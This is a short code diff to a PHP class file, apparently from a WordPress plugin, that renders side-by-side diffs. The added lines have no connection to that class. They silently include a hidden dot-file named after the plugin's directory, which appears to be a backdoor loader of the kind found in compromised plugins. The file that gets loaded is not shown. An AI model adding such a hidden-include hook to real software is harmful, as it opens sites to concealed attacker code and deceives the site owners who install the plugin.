@@ -42,6 +42,10 @@
 
 require_once dirname(__FILE__).'/Array.php';
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPR_Diff_Renderer_Html_SideBySide extends WPR_Diff_Renderer_Html_Array
 {
 	/**
